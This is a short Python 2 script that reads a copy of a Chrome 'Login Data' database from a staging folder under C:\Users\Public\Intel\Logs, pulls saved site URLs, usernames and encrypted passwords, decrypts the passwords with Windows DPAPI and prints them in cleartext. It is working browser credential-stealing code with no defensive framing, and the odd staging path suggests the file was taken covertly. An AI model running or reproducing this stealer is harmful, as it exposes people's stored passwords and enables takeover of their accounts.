import os
import sqlite3
import win32crypt
import sys
path = 'C:\\Users\\Public\\Intel\\Logs\\Login Data'
    

# Connect to the Database
try:
    print '[+] Opening ' + path
    conn = sqlite3.connect(path)
    cursor = conn.cursor()
except Exception, e:
    print '[-] %s' % (e) 
    sys.exit(1)

# Get the results
try:
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
except Exception, e:
    print '[-] %s' % (e)
    sys.exit(1)

data = cursor.fetchall()

if len(data) > 0:
    for result in data:
        
    # Decrypt the Password
        try:
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        except Exception, e:
            print '[-] %s' % (e)
            pass
        if password:
            print '''[+] URL: %s
        Username: %s 
        Password: %s''' %(result[0], result[1], password)
else:
    print '[-] No results returned from query'
    sys.exit(0)
